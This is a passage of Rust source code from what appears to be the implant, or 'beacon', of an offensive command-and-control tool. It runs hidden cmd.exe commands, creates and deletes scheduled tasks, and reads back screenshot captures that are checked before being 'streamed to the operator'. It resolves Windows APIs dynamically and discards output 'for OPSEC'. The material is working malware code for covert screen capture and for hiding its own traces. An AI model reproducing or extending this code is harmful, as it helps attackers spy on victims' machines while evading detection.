/// Run a NUL-terminated UTF-16 command line via `cmd.exe /C` in the current
/// session, waiting up to 30s for it to finish. Returns true if cmd exited 0.
/// Used by cross_session_capture to drive the schtasks create/run/delete
/// commands — all same-session (the beacon's own token), no token juggling.
/// Stdout/stderr are discarded (CREATE_NO_WINDOW + no pipe) for OPSEC.
unsafe fn run_cmd_wait(cmdline: *mut u16) -> bool {
    type CreateProcessW = unsafe extern "system" fn(
        *const u16,
        *mut u16,
        *const c_void,
        *const c_void,
        i32,
        u32,
        *const c_void,
        *const u16,
        *mut StartupInfoRun,
        *mut ProcessInfoRun,
    ) -> i32;
    #[repr(C)]
    struct StartupInfoRun {
        cb: u32,
        lp_reserved: *const u16,
        lp_desktop: *const u16,
        lp_title: *const u16,
        dw_x: u32,
        dw_y: u32,
        dw_x_size: u32,
        dw_y_size: u32,
        dw_x_count_chars: u32,
        dw_y_count_chars: u32,
        dw_fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        cb_reserved2: u16,
        lp_reserved2: *mut u8,
        h_std_input: *mut c_void,
        h_std_output: *mut c_void,
        h_std_error: *mut c_void,
    }
    #[repr(C)]
    struct ProcessInfoRun {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_pid: u32,
        dw_tid: u32,
    }
    let cpw: CreateProcessW = match unsafe { export_addr(b"kernel32.dll", b"CreateProcessW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let wso: unsafe extern "system" fn(*mut c_void, u32) -> u32 =
        match unsafe { export_addr(b"kernel32.dll", b"WaitForSingleObject") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let gec: unsafe extern "system" fn(*mut c_void, *mut u32) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"GetExitCodeProcess") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };

    // Prepend "cmd.exe /C " to the command so redirection/multi-arg parsing is
    // handled by cmd. Build in one writable buffer (CreateProcessW may mutate
    // lpCommandLine in place).
    let mut full = crate::heap::Vec::<u16>::with_capacity(12);
    for &by in b"cmd.exe /C " {
        full.push(by as u16);
    }
    // Append the caller's cmdline (up to its NUL).
    let mut i = 0usize;
    unsafe {
        while *cmdline.add(i) != 0 {
            full.push(*cmdline.add(i));
            i += 1;
        }
    }
    full.push(0);

    let mut si: StartupInfoRun = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<StartupInfoRun>() as u32;
    let mut pi: ProcessInfoRun = unsafe { core::mem::zeroed() };
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let ok = unsafe {
        cpw(
            core::ptr::null(),
            full.as_mut_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            0,
            CREATE_NO_WINDOW,
            core::ptr::null(),
            core::ptr::null(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return false;
    }
    let waited = unsafe { wso(pi.h_process, 30_000) };
    let mut code: u32 = 0;
    let _ = unsafe { gec(pi.h_process, &mut code) };
    let _ = unsafe { close_h(pi.h_thread) };
    let _ = unsafe { close_h(pi.h_process) };
    waited == 0 && code == 0 // WAIT_OBJECT_0 && exit 0
}

/// `schtasks /delete /tn <name> /f`. Best-effort cleanup of the one-shot task
/// created by cross_session_capture. Returns true if the schtasks call exited 0.
unsafe fn delete_task(task_name: &[u16]) -> bool {
    let mut cmd = crate::heap::Vec::<u16>::with_capacity(40 + task_name.len());
    for &by in b"schtasks /delete /tn " {
        cmd.push(by as u16);
    }
    cmd.extend_from_slice(task_name);
    for &by in b" /f\0" {
        cmd.push(by as u16);
    }
    unsafe { run_cmd_wait(cmd.as_mut_ptr()) }
}

/// Widen an ASCII slice into UTF-16 and append to `v` (no NUL).
fn cmd_extend_wide(v: &mut crate::heap::Vec<u16>, ascii: &[u16]) {
    v.extend_from_slice(ascii);
}

/// Decimal-encode a u16 (0–9999) and append as ASCII chars to `v`.
fn push_dec_u16(v: &mut crate::heap::Vec<u16>, n: u16) {
    if n == 0 {
        v.push(b'0' as u16);
        return;
    }
    let mut buf = [0u8; 5];
    let mut i = buf.len();
    let mut m = n;
    while m > 0 {
        i -= 1;
        buf[i] = b'0' + (m % 10) as u8;
        m /= 10;
    }
    for &b in &buf[i..] {
        v.push(b as u16);
    }
}

unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
    let cf: unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *const c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CreateFileW")?) };
    let rf: unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *const c_void) -> i32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"ReadFile")?) };
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        unsafe { core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle")?) };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    let h = unsafe {
        cf(
            wide.as_ptr(),
            0x8000_0000,
            1,
            core::ptr::null(),
            3,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        return None;
    }
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 8192];
    // Read loop: only treat `got == 0` (true EOF — ReadFile returns nonzero with
    // zero bytes) as end-of-file. The old code broke on ANY short read
    // (`got < buf.len()`), which is not a reliable EOF signal — a partial read
    // from a concurrently-dying/flushing writer would be returned as a truncated
    // BMP. ReadFile failure (returns 0) is now a hard error.
    loop {
        let mut got: u32 = 0;
        let ok = unsafe {
            rf(
                h,
                buf.as_mut_ptr(),
                buf.len() as u32,
                &mut got,
                core::ptr::null(),
            )
        };
        if ok == 0 {
            // ReadFile itself failed — the partial buffer is untrustworthy.
            let _ = unsafe { ch(h) };
            return None;
        }
        if got == 0 {
            break; // true EOF
        }
        out.extend_from_slice(&buf[..got as usize]);
    }
    let _ = unsafe { ch(h) };
    // Validate the result is a complete, well-formed BMP before trusting it.
    // Min BMP = 14-byte file header + 40-byte info header. Check the "BM" magic
    // and that the file-size field in the header matches what we actually read —
    // a mismatch means a truncated capture (missing scan lines), which must NOT
    // be streamed to the operator as a valid screenshot.
    if out.len() < 58 || &out[0..2] != b"BM" {
        return None;
    }
    let declared = u32::from_le_bytes([out[2], out[3], out[4], out[5]]) as usize;
    if declared != out.len() {
        return None; // truncated — declared size ≠ actual bytes read
    }
    Some(out)
}

/// Best-effort delete. Returns the DeleteFileW BOOL (nonzero = deleted) so
/// callers can surface a persistent-artifact warning if the temp file couldn't
/// be removed (locked / ACL). -1 if DeleteFileW itself couldn't be resolved.
unsafe fn del_file(path: &[u8]) -> i32 {
    let df: unsafe extern "system" fn(*const u16) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"DeleteFileW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return -1,
        };
    let mut wide = crate::heap::Vec::<u16>::with_capacity(path.len());
    for &by in path {
        if by == 0 {
            break;
        }
        wide.push(by as u16);
    }
    wide.push(0);
    unsafe { df(wide.as_ptr()) }
}

unsafe fn close_h(h: *mut c_void) -> i32 {
    let ch: unsafe extern "system" fn(*mut c_void) -> i32 =
        match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return 0,
        };
    unsafe { ch(h) }
}
